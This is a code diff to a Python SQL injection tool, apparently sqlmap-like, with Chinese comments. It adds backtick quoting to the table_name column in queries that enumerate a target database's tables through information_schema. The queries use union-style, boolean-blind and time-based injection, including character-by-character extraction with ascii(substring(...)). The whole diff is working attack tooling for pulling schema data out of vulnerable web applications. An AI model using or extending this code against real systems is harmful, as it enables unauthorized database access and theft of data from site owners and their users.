@@ -52,7 +52,7 @@ class SqliTables(SqliDatabases):
                     # 首先是tablename的长度
                     logger.debug("Start %dth table length sqli..." % (i + 1))
 
-                    table_name_len = normal_injection(select='length(table_name)',
+                    table_name_len = normal_injection(select='length(`table_name`)',
                                                       source="information_schema.tables",
                                                       conditions="table_schema = '" + database_name + "'",
                                                       limit=i,
@@ -66,7 +66,7 @@ class SqliTables(SqliDatabases):
                     # 然后注tablename
                     logger.debug("Start %dth table name sqli..." % (i + 1))
 
-                    table_name = normal_injection(select='table_name',
+                    table_name = normal_injection(select='`table_name`',
                                                   source='information_schema.tables',
                                                   conditions="table_schema = '" + database_name + "'", limit=i,
                                                   dealpayload=self.dealpayload,
@@ -84,7 +84,7 @@ class SqliTables(SqliDatabases):
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start table amount sqli...")
 
-                retVal = build_injection(select="COUNT(table_name)",
+                retVal = build_injection(select="COUNT(`table_name`)",
                                          source="information_schema.tables",
                                          conditions="table_schema = '" + database_name + "'",
                                          dealpayload=self.dealpayload, data=self.Data, lens=self.len,
@@ -98,7 +98,7 @@ class SqliTables(SqliDatabases):
                     # 然后注tables_name 的 length
                     logger.debug("Start %dth table length sqli..." % (i + 1))
 
-                    retVal = build_injection(select="length(table_name)",
+                    retVal = build_injection(select="length(`table_name`)",
                                              source="information_schema.tables",
                                              conditions="table_schema = '" + database_name + "'",
                                              limit=i,
@@ -115,7 +115,7 @@ class SqliTables(SqliDatabases):
                     logger.debug("Start %dth table sqli..." % (i + 1))
 
                     for j in trange(int(table_name_len), desc='%dth Table sqli' % (i + 1), leave=False):
-                        retVal = build_injection(select="ascii(substring(table_name," + repr(j + 1) + ",1))",
+                        retVal = build_injection(select="ascii(substring(`table_name`," + repr(j + 1) + ",1))",
                                                  source="information_schema.tables",
                                                  conditions="table_schema = '" + database_name + "'",
                                                  limit=i,
@@ -134,7 +134,7 @@ class SqliTables(SqliDatabases):
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start table amount sqli...")
 
-                retVal = time_injection(select="COUNT(table_name)",
+                retVal = time_injection(select="COUNT(`table_name`)",
                                         source="information_schema.tables",
                                         conditions="table_schema = '" + database_name + "'",
                                         dealpayload=self.dealpayload, data=self.Data, times=self.time,
@@ -148,7 +148,7 @@ class SqliTables(SqliDatabases):
                     # 然后注tables_number 的length
                     logger.debug("Start %dth table length sqli..." % (i + 1))
 
-                    retVal = time_injection(select="length(table_name)",
+                    retVal = time_injection(select="length(`table_name`)",
                                             source="information_schema.tables",
                                             conditions="table_schema = '" + database_name + "'",
                                             limit=i,
@@ -165,7 +165,7 @@ class SqliTables(SqliDatabases):
                     logger.debug("Start %dth table sqli..." % (i + 1))
 
                     for j in trange(int(table_name_len), desc='%dth Table sqli' % (i + 1), leave=False):
-                        retVal = time_injection(select="ascii(substring(table_name," + repr(j + 1) + ",1))",
+                        retVal = time_injection(select="ascii(substring(`table_name`," + repr(j + 1) + ",1))",
                                                 source="information_schema.tables",
                                                 conditions="table_schema = '" + database_name + "'",
                                                 limit=i,
